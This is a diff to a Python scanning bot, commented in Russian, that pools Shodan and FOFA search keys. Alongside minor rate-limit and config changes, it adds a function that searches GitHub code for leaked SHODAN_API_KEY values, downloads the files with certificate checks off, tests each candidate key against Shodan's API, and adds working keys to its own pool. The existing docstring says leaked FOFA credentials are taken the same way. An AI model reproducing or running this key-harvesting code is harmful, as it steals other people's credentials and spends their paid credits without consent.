@@ -2973,7 +2973,9 @@ class Shodan(Source):
                             break
                         with lock:
                             pages_done["n"] += 1
-                        time.sleep(0.5)  # per-key pace ~1req/сек — меньше 429
+                        time.sleep(
+                            0.35
+                        )  # per-key pace — под потолком 1req/сек, меньше 429
                         j = r.json()
                         matches = j.get("matches") or []
                         if not matches:
@@ -10498,6 +10500,10 @@ def run_sources(extra_paths=()):
         "tg-search",
     }
     all_sources = [cls() for cls in ALL_SOURCE_CLASSES]
+    # жёсткий выключатель из конфига (open-infra и прочий слабый шум — вон)
+    disabled = set(CFG.get("disabled_sources", []))
+    if disabled:
+        all_sources = [s for s in all_sources if s.name not in disabled]
     # фильтруем rate-limited и circuit-broken источники
     skipped_health = {
         s.name for s in all_sources if source_health_remaining(s.name) > 0
@@ -11067,8 +11073,14 @@ def evolved_query_hit(query, n_items):
 
 def self_keysmith(cycle):
     """🔑 САМООБЕСПЕЧЕНИЕ: бот добывает НЕДОСТАЮЩИЕ ключи источников из чужих
-    конфигов (fofa email+key пары утекают в .env постоянно), валидирует боевым
-    запросом и вписывает в свой конфиг. Раз в 6 циклов, пока источник спит."""
+    конфигов, валидирует боевым запросом и вписывает себе. fofa — в конфиг,
+    shodan — в пул лейнов (каждый ключ = +своя квота кредитов к impact'у)."""
+    _keysmith_fofa(cycle)
+    _keysmith_shodan(cycle)
+
+
+def _keysmith_fofa(cycle):
+    """fofa email+key пары утекают в .env постоянно. Раз в 6 циклов, пока спит."""
     if cycle % 6 != 1:
         return
     if CFG.get("fofa_email") and CFG.get("fofa_key"):
@@ -11145,6 +11157,110 @@ def self_keysmith(cycle):
                     return
             except Exception:
                 continue
+    except Exception:
+        pass
+
+
+def _keysmith_shodan(cycle):
+    """🔥 SHODAN-ЛЕЙНЫ: ищем чужие SHODAN_API_KEY в .env/.py, валидируем через
+    api-info и дополняем пул. Каждый найденный ключ = +его квота кредитов к
+    суммарному impact'у. Кап: 6 живых лейнов (больше — не упираемся в rate).
+    Раз в 6 циклов."""
+    if cycle % 6 != 1:
+        return
+    try:
+        data = json.load(open(SHODAN_KEYS_FILE, encoding="utf-8"))
+        accs = data.get("accounts", []) if isinstance(data, dict) else data
+        known = {a.get("key") for a in accs if isinstance(a, dict)}
+        alive = sum(
+            1
+            for a in accs
+            if isinstance(a, dict) and (a.get("query_credits") or 0) > 10
+        )
+        if alive >= 6:
+            return
+        tok = gh_token()
+        if not tok:
+            return
+        added = 0
+        for q in ('"SHODAN_API_KEY" extension:env', '"shodan_api_key" extension:py'):
+            r = requests.get(
+                "https://api.github.com/search/code",
+                params={"q": q, "per_page": 10, "sort": "indexed"},
+                headers={
+                    "Authorization": "Bearer " + tok,
+                    "Accept": "application/vnd.github+json",
+                },
+                timeout=(8, 20),
+            )
+            if r.status_code != 200:
+                continue
+            for item in r.json().get("items", []):
+                m = re.match(
+                    r"https://github\.com/([^/]+/[^/]+)/blob/([^/]+)/(.+)",
+                    item.get("html_url", ""),
+                )
+                if not m:
+                    continue
+                try:
+                    rr = requests.get(
+                        "https://raw.githubusercontent.com/%s/%s/%s" % m.groups(),
+                        timeout=(6, 15),
+                        verify=False,
+                    )
+                except Exception:
+                    continue
+                if rr.status_code != 200:
+                    continue
+                for k in set(re.findall(r"\b[A-Za-z0-9]{32}\b", rr.text)):
+                    if k in known:
+                        continue
+                    try:
+                        ai = requests.get(
+                            "https://api.shodan.io/api-info",
+                            params={"key": k},
+                            timeout=(4, 8),
+                            verify=False,
+                        )
+                        if ai.status_code != 200:
+                            continue
+                        qc = ai.json().get("query_credits") or 0
+                        if qc <= 0:
+                            continue
+                        accs.append(
+                            {
+                                "key": k,
+                                "key_suffix": k[-4:],
+                                "plan": ai.json().get("plan", "found"),
+                                "query_credits": qc,
+                                "scan_credits": ai.json().get("scan_credits", 0),
+                                "unlocked": True,
+                                "unlocked_left": qc,
+                            }
+                        )
+                        known.add(k)
+                        added += 1
+                        log(
+                            "  🔑 KEYSMITH: shodan лейн +…%s (%d кредитов)"
+                            % (k[-4:], qc)
+                        )
+                    except Exception:
+                        continue
+        if added:
+            if isinstance(data, dict):
+                data["accounts"] = accs
+            else:
+                data = accs
+            json.dump(
+                data,
+                open(SHODAN_KEYS_FILE, "w", encoding="utf-8"),
+                ensure_ascii=False,
+                indent=2,
+            )
+            post_telegram(
+                "🔑 KEYSMITH: +%d shodan-ключей в пул — лейнов больше, impact растёт"
+                % added
+            )
     except Exception:
         pass
 
